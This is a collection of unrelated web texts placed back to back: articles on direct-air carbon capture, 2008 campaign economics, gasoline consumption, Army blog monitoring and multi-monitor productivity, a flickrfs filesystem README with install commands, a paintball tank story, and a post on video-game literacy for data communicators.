" Take acute pain now in order to avoid years of chronic pain , " he says .
" Basic rule of thumb :
Be on offense , not on defense . "
And the offense ?
Graft social networking features onto the online Times , of course .
Here ’s a simple solution to global warming : vacuum carbon dioxide out of the air .
Klaus Lackner , a physicist at Columbia University , said placing enough carbon filters around the planet could reel the world ’s atmosphere back toward the 18th century , like a climatic time machine .
After a decade of work , his shower - sized prototype whirs away inside a Tucson warehouse , each day capturing about 10 pounds of the heat - trapping greenhouse gas as air wafts through it .
Only a few billion tons to go .
Advertisement
In the battle against global warming , technology has long been seen as the ultimate savior , but Lackner ’s machine is a clunky reminder of how distant that dream is .
He estimates that sucking up the current stream of emissions would require about 67 million boxcar - sized filters at a cost of trillions of dollars a year .
The orchards of filters would have to be powered by complexes of new nuclear plants , dams , solar farms or other clean - energy sources to avoid adding more pollution to the atmosphere .
Despite the scope of the proposal , the allure of high technology is irresistible for modern humans .
Salvation has arrived again and again over the last century : the automobile , the jet , the Internet , the iPod .
Advertisement
That dream has pushed scattered groups of scientists to work on massive schemes to reengineer the planet .
One idea is to block sunlight , either by constructing artificial volcanoes to blast sulfur particles into the atmosphere or by launching millions of tiny satellites into space and arranging them into a giant mirror .
Another concept is sprinkling iron over the oceans to nurture plankton colonies that would absorb carbon dioxide from the air and transfer it to the depths .
But while the science of dialing back the planet ’s thermostat is straightforward , the execution is fabulously expensive , complex and grandiose on a scale that boggles the mind .
Advertisement
“ Nobody doubts it is possible to take CO2 out of the air , ” said David Keith , a professor of engineering and economics at the University of Calgary in Canada and one of several scientists around the world working on the problem .
“ The issue is , ‘ What does it cost ? ’ ”
Some policy experts argue that blind faith in technology is a harmful distraction from the hard sacrifices needed to control global warming .
“ The temptation is to say , ‘ Let ’s get John Wayne on horseback or Bill Gates . . . and solve this problem , ’ ” said Dale Jamieson , director of environmental studies at New York University .
But some scientists say that the potential of such ideas cannot be ignored given the world ’s political paralysis on controlling emissions and its myopic addiction to cheap and dirty coal .
Advertisement
“ There are not that many alternatives , ” Lackner said .
The attraction of a technological silver bullet lies in the failure of the world to solve global warming through the obvious solution : reducing emissions .
The 1997 Kyoto accords were supposed to bring the world together to address the problem , but the two biggest polluters , the United States and China , have refused to cap their emissions , and Europe is failing to meet even its modest targets .
Worldwide annual emissions of carbon dioxide -- the main culprit in global warming -- have climbed 28 % over the last decade , according to the U.S. Department of Energy .
The rise has been largely driven by industrializing countries , such as China and India , which argue that they have the right to exploit their coal reserves to catch up with the West .

It is clear that cheap energy is a drug that civilization will not give up .
But big technological solutions could allow society to keep its drug .
Among the options , carbon filtering is the most direct and best understood .
If industrialization is a process of transferring carbon stored in the earth to the atmosphere , filtering seeks to put it back .
The technology is decades old .
Bottled oxygen used in hospitals started out as plain air before nitrogen , carbon dioxide and other gases were filtered out .
Space capsules and submarines extract carbon dioxide to maintain breathable air for crew members .
The process for removing atmospheric carbon involves putting one compound , usually a hydroxide , in contact with the air , setting off a reaction that grabs CO2 and incorporates its carbon atoms into a carbonate compound .
Advertisement
Then , in a reaction that requires a large input of heat , the carbonate compound is broken apart , reconstituting and trapping the carbon dioxide .
Researchers propose pumping the captured CO2 into the ground , a practice already used to increase the pressure in oil wells .
Geologists say there is room in subterranean rock formations to lock it away forever .
The beauty of carbon capture is that it scrubs the planet without intruding on it , unlike artificial volcanoes and sun reflectors , which could cause enormous planetary damage in the form of acid rain or giant shadows that stunt crops .
The filters could be placed anywhere in the world , since carbon dioxide disperses throughout the atmosphere .
Advertisement
For all its appeal , the process is hideously inefficient .
Carbon dioxide makes up less than 0.04 % of the atmosphere , and removing climate - changing quantities of it requires filtering massive amounts of air .
Lackner calculated that sucking up all 28 billion tons of CO2 released worldwide each year would require spreading out his machines over a land area the size of Arizona .
That seems like a reasonable sacrifice to save civilization , until you consider the expense .
Experts estimate that it would cost up to $ 200 a ton to filter and store carbon dioxide from the air .
That means the yearly vacuuming bill could reach $ 5.6 trillion .
Advertisement
Even filtering the greenhouse gas from smokestacks , where it is hundreds of times more concentrated and thus much cheaper to capture , is still deemed too expensive for commercial use .
The enormous cost raises the question : Who would pay ?
It is the same impasse that has stymied efforts toward a global agreement to reduce emissions .
China argues that the West should foot the bill because it created the problem over the last two centuries .
The United States says China must accept its share of responsibility as the world ’s new top polluter .
The cost of the technology will surely fall over time , but without government action that is unlikely to happen soon enough to stave off the worst effects of climate change .
Advertisement
Without at least a 50 % cut in emissions by mid-century , the United Nations ’ Intergovernmental Panel on Climate Change predicts that the temperature rise will exceed 2 degrees , resulting in worsening drought , a dangerous sea level rise and widespread extinction of species .
Paul Crutzen , a Nobel Prize - winning atmospheric chemist at the Max Planck Institute for Chemistry in Mainz , Germany , said that the failure to cut emissions might force the world to reshape the environment through drastic use of technology .
The risks could be enormous , but the risks of failing to reduce emissions could be greater , he said .
Crutzen said that only out of a “ sense of despair ” had he come to favor the last - ditch option of spewing more than a million tons of sulfur a year into the air .
Advertisement
It ’s a dirty proposition that , in some ways , is its own environmental crime .
But it works , as shown by the 1991 Mt. Pinatubo eruption in the Philippines , which temporarily cooled the planet by almost 1 degree Fahrenheit .
“ It might be the last escape route from the problem , ” he said .
The power to reengineer the planet raises another question :
Who gets to control the thermostat ?
Despite the perception that climate change is a global problem , it is in reality a series of regional transformations that benefits some places and harms others .
Countries in the far northern latitudes have less incentive than tropical countries to counteract the warming .
Russia has already laid claim to the North Pole in hopes that the arctic thaw will open access to new oil reserves .
Canada is pondering the possibility of its vast expanse of tundra becoming a breadbasket .
With enough carbon filters , a single country or even several rich individuals would have the power to set the world ’s temperature .
Advertisement
“ No matter how you go about it , there will be a lot of politics , ” Lackner said .
For now , his machine , a solitary prototype , continues to hum away in the Tucson warehouse .
With no good place to store the carbon dioxide it traps , the gas is simply released back into the air .

Acknowledgements About Flickrfs is a virtual filesystem which mounts on your linux machine like any other partition .
Once mounted , it retrieves information about your photos hosted on your flickr account , and shows them as files .
You can now easily copy photos from your local machine to this mount , and it will automatically upload them to your flickr account .
Similary , you can copy the files from your mount to your local machine , and it will download your images from flickr .
All the files in the mount have a meta file attached to them , which provides access to title , description , tags , and license information .
Modifying any of these fields and saving the meta file , will update them on the server as well .
You can easily specify what is the default resolution of photos that you wish to upload , and the fs will automatically resize ( read downsize ) the photo , and upload it .
That 's not all , the latest verion of flickrfs , provides a syncing mechanism .
This mechanism automatically syncs any changes done online directly to flickr account ( using flickr 's web interface or any other third party apps ) , to your mount .
Thus , any addition / deletion / changes of sets / images is reflected back to your mount .
No stale information !
You just to mount it once , and it can be used forever !
Structure Flickrfs Home Directory $ HOME /. flickrfs : config.txt
Allows you to set the default image size , and the time interval for the syncing of / sets and / stream to flickr online server .
Allows you to set the default image size , and the time interval for the syncing of / sets and / stream to flickr online server .
log log file which keeps record of activity going on in flickrfs .
Useful for debugging purposes .
In case you find a bug , post it along with this file on the mailing list .
The filesystem mount point contains these following folders by default :
/ sets / sets folder contains your sets , including your private photos .
You can easily add / delete sets using standard linux commands .
/ tags ( contains / tags / personal and / tags / public ) / tags / personal folder allows search based upon tags in your photostream .
Just create a folder ( use mkdir ) whose name is a colon delimited tags like ' tag1:tag2:tag3 ' , and the fs will search your photostream to match all the photos which contain ALL these tags , and show them as files inside the directory .
/ tags / public does the same thing , but searches for public photos even outside your photostream .
/ stream ( not created by default ) / stream folder will contain ALL the photos that are present and accessible in your photostream .
Obviously these wd also include photos from your sets .
This folder is not created by default .
You need to create directory named ' stream ' in the root of mount point for the fs to populate the photos .
Once the folder is created , it can't be removed .
Feature List and Usage New in flickrfs Release 1.3.9 Integration with Berkeley DB - Minimal hardware resource consumption by flickrfs
flickrfs has been integrated with Berkeley DB using python 's bsddb module .
Which means flickrfs would now store the image information in Berkeley db database , instead of storing it in memory .
Let come millions of images , flickrfs would still consume only negligible amounts of RAM .
Regarding hard disk space , it would be in order of 10s of Megabytes ; not an issue for today 's computers .
Performance increase flickrfs retrieves the sets information in parallel , background threads .
Hence , the directory structure is created quickly , allowing users to start working .
If some sets could n't be retrieved the first time , they'd be taken care of when * syncing * kicks in .
Secondly , full metadata information of images would only be retrieved when asked for ; though they 'll always be listed in the directory .
Its just like the way flickrfs handles images .
Robust execution of flickr operations on small bandwidth Flickr operations , as in , interactions with flickr server are now fail - safe .
flickrfs handles the URLError exceptions thrown by the operation , checks its result , and retries the operation multiple times in case of failure .
Thus , even if connection is lost temporarily , flickrfs would continue its operations unaffected .
config file would be automatically created config .
txt file , present in ~/. flickrfs would be created automatically , if not present .
Normally the default values would be fine , but feel free to change it according to your needs .
Bandwidth information of flickr account statfs system call is now tied to the bandwidth usage information of your flickr account .
You can view it by running a $ df -h
New in flickrfs Release 1.2.9
Automatic periodic syncing of fs with online server .
flickrfs will automatically sync any changes done directly through flickr web interface / organizer or any other third party apps , to its local mount dynamically .
This include changes to your / sets and / stream .
The photos present in / tags are not synced , simply because / tags is meant just for searching / downloading purposes .
The time interval can be specified through config .
txt file .
The default interval specified is 10 mins .
Automatic resizing of photos while uploading .
NOTE : This does not affect the original photo .
Only a copy is resized , and uploaded .
If your photo resolution is high , fs will automatically downsize ( a copy of it , not original photo ) to the resolution specified in config .
txt file , before uploading .
This also reduces the image 's size , thus useful to people with limited 20 MB upload limit .
Note that if the image is smaller than the specified size , it would not be resized , and the original size will be uploaded .
Unicode Support More robust unicode support .
This feature is still in testing mode , so if you find any bug , feel free to contact us .

$ chmod 764 image_ID.jpg # to make it available to family only $ chmod 754 image_ID.jpg # to make it available to friends only $ chmod 744 image_ID.jpg # to make it private
Time : Modification time of the image is set to its last update time on flickr , while creation time is set to the time when the image was uploaded to flickr .
$ ls -l # Sort photos in asc. order according to ' last update ' $ ls - cl # Sort photos in asc. order according to ' date uploaded '
Uploading Copy the image to either / sets / yourset or / stream , with the directoy name as follows : $ cp /mycamera/myimage.jpg /mntpoint/stream:tag1:tag2:tag3 / and the photo will be uploaded with the three tags , and an additional tag ' flickrfs ' .
Spaces in tags are allowed .
To create a new set , just create a directory in / sets / .
The first photo that you copy or link to that directory will become the primary photo of that set .
When you execute a mkdir , copy your first photo quickly , so that the set is created online .
Otherwise , the sync thread will delete the new directory , seeing it as incoherent with online server .
$ cp /mycamera/myimage.jpg /mntpoint/sets/newset:tag1:tag2:tag3 /
Note the ' / ' at the end of the destination paths .
This is required to differentiate b/w a filename and directory .
Note : / tags / personal can no longer be used for uploading photos .
Use / stream for that .
Directly link photos from your stream or tags to sets , without downloading .
[ Introduced in v1.2.9 ]
Use your ln command to directly add a photo present in your / stream to a set .
$ ln / mntpt / stream/image.jpg /mntpt/sets/yourset/ $ ln / mntpt/tags/personal/../image.jpg
/mntpt/sets/yourset /
OR , if you wish to add a new set altogether , just create a new dir before executing link ( ln ) .
When you execute a mkdir , link your first photo quickly , so that the set is created online .
Otherwise , the sync thread will delete the new directory , seeing it as incoherent with online server .
$ mkdir / mntpoint / sets / newset
Deleting Flickrfs does n't allow / do deletion of photos .
It is to prevent a 'rm *' accident !
You can easily remove photos from your sets though .
$ rm / mntpoint/sets/myset/image1_ID.jpg
If the photo is the last photo in the set , the set will be deleted automatically .
Searching
To search your personal photos for tags : tag1 , tag2 and tag3 ; create a directory in / tags / personal : $ mkdir / mntpoint/tags/personal/tags1:tags2:tags3
To search public photos , do so in / tags / public .
The directory will store the results as files , with a maximum of 500 files .
Downloading
Copy the image from the mount to your local harddisk , and the original size of the image will be downloaded .
If original size if not present , the accessible largest size of the photo will be downloaded .
$ cp /mntpoint /< path to image>/image1_ID.jpg ~/myphotos /
Switch Account
If you wish to switch account , just delete the folder $ HOMEDIR /. flickr .
This will remove your cache , and ask for authentication next time you mount the fs. $ rm - R ~/.flickr /*
Installation Ubuntu 1 .
Open synaptics or use apt - get , and Install the following packages : fuse - utils
libfuse2
python2.4 - fuse ( if you have python 2.4 installed )
python-fuse
Imagemagick ( needed for image resizing .
You can skip this if you wish to upload the original size of photos only . )
$ sudo apt - get install libfuse2 fuse - utils python2.4 - fuse Imagemagick 2 . Execute commands : $ sudo modprobe fuse
$ sudo chmod 755 / usr / bin / fusermount $ sudo chmod u+s /usr / bin / fusermount $ sudo chmod 666 / dev/ fuse 3 .
Download flickrfs package from sourceforge , and untar it : $ tar - xzvf flickrfs -*. tar.gz OR , at any point of time , the CVS version of flickrfs will be the most updated .
So , you can directly download from cvs : $ cvs -d:pserver:anonymous@flickrfs.cvs.sf.net :/cvsroot/flickrfs login $ cvs -z3 -d:pserver:anonymous@flickrfs.cvs.sf.net :/cvsroot/flickrfs co - P flickrfs 4 . [ Optional Step ]
The first time flickrfs is run , it would automatically create the config .
txt file with default values .
Otherwise , you can create it yourself , by copying config. txt file in $ HOME /. flickrfs .
Edit the file , to set the following options : [ configuration ] browser:/usr/bin/firefox image.size:1024x768 sets.sync.int:600 stream.sync.int:600
The interval is in seconds .
The default interval set is 10 mins .
The sync of / sets and / stream is irrespective of each other , so you can change the interval values as you like .
For example , if outdated information in / stream does n't bother you , you can change the interval to larger values say , 30 mins .
image .size field specifies the default size that the photos will be resized to before uploading .
If you wish to upload the original size of photos , leave the value blank as follows .
Note that , only a copy of photo is resized , your original photo will not be resized .
image.size : 5 . [ Optional Step ]
Create a screen terminal
What is screen ?
Read the Linux Journal article here Why ?
This will keep the fs mounted even when you log out .
Next time you log in , you can directly access the fs , without having to mount it again .
Saves effort !
$ screen - S flickrfs 6 .
Mount the filesystem Check if fuse module has already been loaded in kernel .
$ lsmod | grep - i fuse # Rerun commands in step 2 if not loaded .
First time you are mounting the fs , you need to close all the browser windows .
Secondly , if you are behind a proxy server , set you http_proxy environment variable in the command line .
$ export http_proxy = " http://proxy.address:port " $ python flickrfs .py / mountpoint
The default web browser used is firefox .
If you use something else , you can set it in config.
txt .
Your browser window will open up , and require you to login , and allow authentication to flickrfs .
Once you do that , close your window .
Flickrfs will now start downloading information .
Wait a few minutes for your sets to populate .
If you wish to view your whole stream , create a directory stream in your mountpoint .
$ mkdir / mntpoint / stream
You are ready to GO !
7. [ Optional Step ]
See flickrfs in action
If you wish , you can view exactly what is flickrfs doing , by checking out the log file present in $ HOME /. flickrfs $ tail -f ~/.flickrfs /log 8 .
Once you 're done , you can unmount the fs To unmount the filesystem , execute the following command $ fusermount -u / mntpoint /
Other Linux distros Follow the installation procedure for ubuntu .
The only difference is in step number 1 , Installation of packages .
You can check if your distro's package manager has these following packages , and install them : fuse
fuse - python
Imagemagick
If not , you can manually retreive and compile the packages from source .
1 . Download and Install FUSE 2 .
Install fuse python bindings .
$ cvs -d:pserver:anonymous@fuse.cvs.sf.net :/cvsroot/fuse login $ cvs -z3 -d:pserver:anonymous@fuse.cvs.sf.net :/cvsroot/fuse co - P python 3 . This step is optional , only for those who wish to use the image resizing functionality .
Check if you already have Imagemagick installed .
$ identify $ convert
If the above commands produce a ' command not found ' error , you need to install Imagemagick .
Download and Install Imagemagick .

A Rommel - wannabe from Kettering University in Flint , Michigan , has built a fully working , 1:2 scale version of the Tiger I 56.9 - tonne heavy tank used by the Wehrmacht in World War II .
Not happy with that , he drives his amazing creation — Guderian - style — on the road , with a " yellow triangle " on the back .
The thing is so menacing that his neighbours called the police , thinking he was planning to take over Poland .
Or Detroit .
It could have gone either way .
Thankfully , the police understood there was no real danger in this vehicle , unless you consider plastering someone in red paint an act of war .

Complete with tank treads and 3 - cylinder diesel engine , this is a paintball version of the Panzerkampfwagen VI — which is the actual technical denomination , it was nicknamed Tiger by Ferdinand Porsche , who competed for the Nazi government contract before doing cars for James Dean .
This Tiger has a scuba - tank - powered cannon instead of terrifying 8.8 cm KwK 36 L/56 cannon that could take out Shermans and Churchills IVs from up to a mile away ( 1,600 meters . )
The armor in this half - sized version , however , it much lighter than the original model , which was able to withstand a direct impact of the 76.2 mm gun of the mighty Soviet T - 34 tank , at any range .
The mini-Tiger would probably not be able to stand the impact of a beer can .
Still , we would love to give it a spin .

It 's Still the Economy , Stupid
But which advisers have the candidates ' ears , and why ?
Robert Pollin
This article is from the March / April 2008 issue of Dollars & Sense : The Magazine of Economic Justice available at http://www.dollarsandsense.org
This article is from the March / April 2008 issue of Dollars & Sense magazine .
" It 's the economy , stupid " was the one memorable slogan to have emerged out of Bill Clinton 's successful first run at the presidency in 1992 , and it became the overarching theme of his eight years in office .
As the U.S. economy has continued to spiral downward in the first months of 2008 , the economy is again emerging as the single most important question of the presidential campaign , even eclipsing the Iraq war as a concern among voters .
What do Barack Obama , Hillary Clinton , and John McCain have to say about our current reality of financial crisis and recession , and the generation - long stagnation in average living standards that has preceded the crisis of the moment ?
There are n't significant distinctions between Obama and Clinton in terms of their campaign platforms , while both Democratic contenders share huge differences with McCain .
But the most important question is not where these candidates stand during the campaign ; it's what they would actually do while in office .
And this is more a matter of political power — which social groups can exert pressure within a new administration — than of economic philosophy .
This point was highlighted in dramatic fashion near the end of the March 4 primary campaigns in Ohio and Texas when Austan Goolsbee , a professor at the University of Chicago and Obama 's chief economic adviser , was reported to have told Canadian diplomats that Obama was far more sympathetic to free trade measures such as NAFTA than he was letting on in his campaign speeches .
Goolsbee denied saying this .
But the fact is , we can't know what Obama would really do on NAFTA and related measures unless he becomes president , facing a whole range of pressures .
These will include big business continuing to seek free access to Mexico 's vast pool of low - wage workers .
In terms of public platforms , McCain advances an uneasy combination of the two strands of thinking that have long been dominant among Republicans — Reaganesque tax cuts that " supply - siders " claim will stimulate economic growth , along with old - school anti-New Deal positions opposing social spending and supporting a balanced federal government budget .
It should not be surprising that McCain 's approach is a mushy amalgam .
McCain openly admitted in late 2007 that " the issue of economics is not something I 've understood as well as I should . "
This is true despite the fact that he has been a member of Congress for 26 years and a two - time presidential candidate .
Obama and Hillary Clinton are increasingly advancing an agenda focused on job creation , affordable health care , greater equity in the tax code , limits on free trade , and combining economic growth with environmental protection — so - called " green growth . "
These are certainly desirable goals .
But keep in mind that Bill Clinton advanced similar goals in 1992 , under his economic program of " Putting People First . "
Yet Clinton 's economic program changed drastically even during the two - month interregnum between the November election and his inauguration in January 1993 .
During this time , Clinton decided that the first priority of his administration would be to serve the interests of Wall Street .
The Clinton years were defined by across - the - board reductions in government spending as a share of the economy 's total spending , virtually unqualified enthusiasm for free trade , tepid and inconsistent efforts to assist working people in labor markets , and the deregulation of financial markets .
Bill Clinton even conceded during the period before his inauguration that with his new policy focus , " we help the bond market and we hurt the people who voted us in . "
Either Hillary Clinton or Barack Obama could easily fall into this same trap if they are not faced with intense pressure from progressive forces to maintain their campaign commitments .
Such a concern was certainly underscored by the reports of Goolsbee 's comments to the Canadians on NAFTA .
We get some insights into the likely economic policy approaches of McCain , Clinton and Obama — probably more than by reading their respective platforms — by considering whom they are listening to now , and who would be likely to serve as high - level advisers in a McCain , Clinton , or Obama White House .
McCain has said he will call on people like Pete Peterson and Jack Kemp .
Peterson is a billionaire Wall Street investor and a former Commerce Secretary under Richard Nixon .
He has long favored cutting deeply into Social Security , Medicare , and other welfare - state policies as a means of maintaining balanced federal government budgets .
Not surprisingly , Peterson also believes that Wall Street titans like himself should continue to enjoy lower tax rates than teachers , firefighters , nurses , and waitresses .
Jack Kemp was a congressman during the 1970s and 1980s , and was an original advocate of deep , across - the - board tax cuts as a tool for stimulating economic growth .
He was thus instrumental in helping define Reaganomics even before Ronald Reagan took office in 1981 .
Kemp argues that fiscal deficits are not a serious problem and that Republicans like Peterson practice " root canal " economics by harping on such matters .
Kemp portrays himself as a populist who wants to unshackle the entrepreneurial energies of the American people by lifting their tax burdens .
But the Reagan tax cuts , like those under George W. Bush , heavily favored the wealthy .
These tax cuts therefore meant more money in the pockets of the rich , with less government revenue to spend on social programs .
This created pressures for cuts in social spending .
Here is where the Peterson and Kemp politics converge .
In both cases , we almost certainly end up with major attacks on social spending , whether the federal budget is in balance or running a deficit .
The economic policy debate should therefore be wide open for either Hillary Clinton or Obama to push hard on an egalitarian agenda focused on jobs , tax fairness , affordable health care , financial regulation , and green growth .
At the same time , Obama has said that the people he will want to listen to on economic policy , beyond Goolsbee , include Robert Rubin , Alan Blinder , and Robert Reich .
As for Hillary Clinton , Rubin has her ear , along with her campaign 's chief economic adviser , Gene Sperling .
All of these men were major economic advisers to Bill Clinton .
Rubin , in particular , was Bill Clinton 's closest economic adviser as well as Treasury Secretary for four years .
And it was Rubin who , even before Clinton 's first inauguration , explained to the more populist camp within the newly forming administration that the rich " are running the economy and make the decisions about the economy . "
Under a Hillary Clinton or Obama administration , there will almost certainly be a replay of this struggle between Wall Street Rubinites and the working - class and middle - class people who will have voted a Democrat into office .
Under Bill Clinton , working people and the middle class lost out to Wall Street .
But I think the chances are higher for a major shift in direction under a new Democratic administration , particularly one under Obama .
My hunch on Obama — and it is only a hunch — follows from how he stacks up as a political figure , compared to Hillary Clinton .
Obama is obviously not bound up with the history of Clintonomics .
His campaign also emerged as a widespread popular movement that has energized a new generation of voters .
But more important than hunches by me or anyone else is the economic reality before us — that conditions for all but the wealthy have stagnated for a generation , under Reagan , Clinton , and the two Bushes ; and that in the short term , we are staring a recession and ongoing financial crisis in the face .
The pressures for a viable progressive agenda focused on financial stability , a jobs stimulus , universal health care , and green growth have correspondingly grown .
Neither Clinton nor Obama can avoid this reality .
After all , Robert Rubin himself , who has been a director and chair of the executive committee of Citigroup since leaving the Clinton administration in 1999 , has been humbled by the massive losses at Citigroup tied to the subprime mortgage crisis .
Alan Blinder , who was on Bill Clinton 's Council of Economic Advisers when the Clinton administration rammed NAFTA through Congress , is now expressing serious concerns about the effects of globalization on middle - class living standards .
In short , a new Democratic administration may well offer possibilities for a dramatic shift in U.S. economic policy , even if some of the same old Bill Clinton crowd returns to the White House .
But if such a major policy shift does occur , it will not be primarily because a Democrat — either Hillary Clinton or Barack Obama — will be sitting in the White House .
It will rather be because the people who put one of them there will have gathered sufficient political strength to make them stick to their campaign promises .

US gasoline consumption falls hardest in 16 years , excepting Katrina
Credit and cash - strapped Americans are beginning to curb their expenses on gasoline as prices continue their upward rise , new government figures show .
In the last six weeks , US gasoline consumption has fallen 1.1 % from 2007 , despite the ever - present increase in cars on the road -- the largest drop in 16 years , excepting declines that followed 2005 's Hurricane Katrina .
Fearing inflation , investors have poured money into commodities , pushing oil prices close to their adjusted value high of $ 103.76 in 1980 , a paid - restricted article in the Wall Street Journal Monday notes .
" As refiners pay more for the oil they use , gasoline prices have gained sharply in recent weeks to an average of $ 3.13 a gallon in the week ended Feb. 25 , up 40 % from $ 2.24 a gallon in January 2007 , " adds the Journal .
" That 's stoking worries that prices will rise even more sharply as demand gets a boost from the approaching vacation season , when more Americans take to the road .
Some experts predict gasoline could cost as much as $ 4 a gallon this summer . "
The rising price of gasoline has also pushed some consumers into fuel - efficient vehicles .
" Pinched consumers also are speeding up their shift to more fuel - efficient cars , " the article notes .
" Sales of large cars dropped by 2.6 % in 2006 and by 10.5 % in 2007 .
In January , they plummeted 26.5 % from a year earlier , according to Autodata Corp .
Dealers are also selling fewer minivans and large SUVs .
Small car sales in January were up 6.5 % from 2007 , according to a survey by Autodata , the article notes .

” It reminded me of you , Dad , ” my son told me , “ because you try playing video games but have difficulties understanding them …even the basic aspects of them .
And you ’re a total button - masher . ”
That is all true .
I took something a little different from the video .
The creator , Razbuten , undertook a slightly - risky marital experiment by asked his wife to try out nine different video games , observing her trials and tribulations like an anthropologist .
From this exercise , Razbuten explored “ the language of video games , and just how much a person ’s level of video game literacy affects their experience with any given title . ”
The lessons for game developers apply equally to analytics translators and anyone trying to reach a data pre-literate audience .
Let me take you on a rundown of the many “ small barriers to entry for new players ” :
1. Discovering the basics
Video games — and data presentation — have their own unique vocabulary that helps quickly convey common concepts .
In games , some of these instructions are never explained in - game ; you ’d have to read the manual ( nobody reads the manual ) .
“ I noticed that there were a vast amount of seemingly basic functions and mechanics that she either did n’t fully grasp or know existed . ”
With so much information presented at once , explanations can be lost to information - overload or skipped past accidentally .
When you are starting from ground zero , people do better if there is less to remember and the information is doled out more slowly .
A few suggestions for data communicators :
“ Give a memorable use of a mechanic ” to make it easier to remember .
In - experience instructions sometimes assume basic skills and understanding .
Do n’t assume .
Most people learn best from other people .
Encourage collaboration and social aspects to build communal knowledge .
2 . " Where the F * #@k am I going ? "
Some games make it easy to know where you are headed .
‘ 2D platformers ’ — the games where you jumping between platforms and navigate through levels — tend to move to the right .
It is a convention that is easy to learn .
Games that explore a 3D world are n’t as kind to novice gamers .
Where you should go next requires picking up on cues that might be well - understood by experts , but invisible to newbies .
Poor Razbuten ’s wife …
“ Due to her not moving the camera around a ton , she did n’t always get a great sense of her surroundings , so she struggled with figuring out where she was and where to go . ”
Nor did she notice important heads - up display features ( e.g. compass , health bars , waypoints ) due to information overload .
When it comes to data communication , we ’ve said it a thousand times : Dashboards seldom provide guidance on where to start and how the user should navigate the information .
That ’s why we designed Juicebox to flow down the page ( “ scrollytelling ” or notebook - style ) .
3 . Too much information
Players are hit with a lot of information when they play games .
If not comfortable with the basics , it can be too much .
Of course this is equally true when it comes to dashboards and data visualizations .
We ’ve all experienced the complex charts with multiple variables and screens full of metrics .
To quote the play , Hamilton :
This financial plan is an outrageous demand
And it 's too many damn pages for any man to understand
For new gamers or data audiences , less is more .
Be a data gourmet , not a data gourmand .
4. Learning the wrong lessons
Razbuten was fascinated by how his wife could misinterpret the cues she was getting to learn the wrong lessons .
In the flurry of information , she assumed a causal game mechanic in a specific action - reaction , when it was a correlation .
Put another way , new players may have difficulty generalizing instructions if they are presented the instructions in a very specific situation .
They do n’t see the larger lesson and how it can be applied in many situations .
This suggests a need to explain the same lesson in multiple ways in multiple scenarios to ensure the new player truly gets the larger lesson .
5. Thinking Games would be Cooler
“ When most people talk about what any video game is like , there is often a greater focus on the general actions players can do rather than the limitations that make it possible for the game to function . ”
There can be a gap between expectations and the necessary reality to make a game work .
New players can get caught in the trap of “ trying to apply a real - world logic , ” and get frustrated when the game does n’t respond as they would expect in the real - world .
However , games ( and data communication tools ) simply can’t offer unlimited flexibility …
“ …limitation exist in games because there are only so many potential inputs a title can have , meaning there are a finite number of ways a player can interact with things .
Also , if developers tried to program in every possible way a player might think about interacting with something , games would just never come out . ”
For data presentation , this is a powerful reminder to set expectations .
What questions can we answer with this dashboard ?
What does it not cover ?
Nevertheless , we ’ve long believed that it is important to give your user some agency in their journey through the data .
If they have the freedom to express what is important to them in the process , they will be more willing to go along for the ride .
6 . The Payoff
“ I think this tradeoff of dealing with frustration so that the excitement of beating something is all that much sweeter , is one that people who play a lot of games not only understand , but look for . ”
The path to satisfaction comes through dedication and overcoming challenges .
You do n’t enjoy the victory without any struggle .
Analytics professionals know this .
They know that there is a struggle with data that starts early , long before it is visualized on a screen .
Gathering , cleaning , understanding , analyzing , designing — the path to insights can be long .
It can also be rewarding .
Novice data workers do n’t yet know all the bumps in the road .
Even seemingly innocent personal blogs are on the Army 's official watch list , according to a report leaked to the controversial Wikileaks website .
Cue press release !
The [ " Army Web Risk Assessment Cell " ] is to " conduct routine checks of web sites on the World Wide Web for disclosure of critical and / or sensitive information that is deemed a potential OPSEC compromise . "
Web sites include , but are not limited to , " Family Readiness Group ( FRG ) pages , unofficial Army web sites , Soldier 's web logs ( blogs ) , and personal published or unpublished works related to the Army . "
The passage comes from a March update to the US Army 's 2007 " Operations Security " regulation 530 - 1 , which is the Army 's high - level document on how the service should keep secrets .
In an unusual circularity , the disclosure of the document on the internet today is something the document was designed to prevent .
It 's worth noting , however , that beyond monitoring them , the Army has stated little interest in shutting down anyone 's blog .
" What we 're finding is that that [ cyberspace ] is not necessarily a problem for us nor are we looking to control this information , " Colonel Wayne Parks from the Army 's " grad school " at Fort Leavenworth , said last week :
We 're just looking to inform our folks well enough that when they say something , they are well - informed and they 're going to state the facts and they 're going to state , you know , the real reasons why we 're doing what we 're doing .
I 'm not too concerned about the idea of cyberspace and control of cyberspace , or on the ground or control of what out folks are saying on the ground .
It 's just a matter of good information and well informed soldiers and leaders .

You can never be too rich or have enough pixels , although , given the price of high - end flat panels , the two can be related .
Those prices and the availability of dual - port graphics cards has led many on the Ars staff to take an alternate approach : fire up multiple monitors .
Most of us pixel junkies swear that the expanded space increases our productivity , but businesses thinking of investing in large - scale rollouts of bigger or multiple displays may want a bit more definitive information .
A study commissioned by display maker NEC and performed at the University of Utah provides some empirical measurements of productivity gain .
NEC provided
Ars with a copy of the study , which recruited students and staff from the university as subjects .
The study used two different tasks to gauge productivity .
The first was standard word processor use , in which two documents containing editing were merged into a third ; the second involved modifying a 30x30 spreadsheet in response to a list of corrections , followed by production of a graph .
Users were given an 20 " monitor , a 24 " widescreen , or dual 20 " displays , and results were scored by time , errors , and ability to follow directions .
For the most part , the more pixels the better , but many of the results were n't statistically significant ; how those extra pixels got there was often not relevant .
The impact of extra pixels was greatest for word processing , where multiple documents had to be open at once , and the widescreen displays edged out dual - monitor configurations .
In contrast , the dual - display edged out the widescreen in the spreadsheet task , but the results were indistinguishable on the statistical level .
The authors also broke down the results according to competency , but that mostly demonstrated that competency trumps pixel count in all circumstances .
Adept computer users outperformed everyone else in all configurations , and saw the least benefit from having more usable workspace .
One interesting trend that did show up was in the dual - display configuration : users took more time setting up their workspace before starting the task , but the extra display space helped them gain back this deficit when compared to single monitor setups .
Regardless of actual performance , however , users tended to like the dual - display setups .
The authors concluded that , by and large , the " best " amount of screen real estate is dictated by task .
" In simple terms , when it comes to desktop real estate , more space means greater productivity until the point is reached where screen size and task requirements intersect , " they write .
In a few tests with even larger ( 26 " displays ) , they found that performance at spreadsheet tasks would actually decline slightly .
Here at Ars , there 's a diversity of opinions on how best to get the pixels we need .
Managing Editor Eric Bangeman could n't run the show here without his three displays , and Ryan Paul suffered through months of crashes before conceding that the Linux drivers were n't good enough to handle a similar setup ( he 's now getting by with two monitors ) .
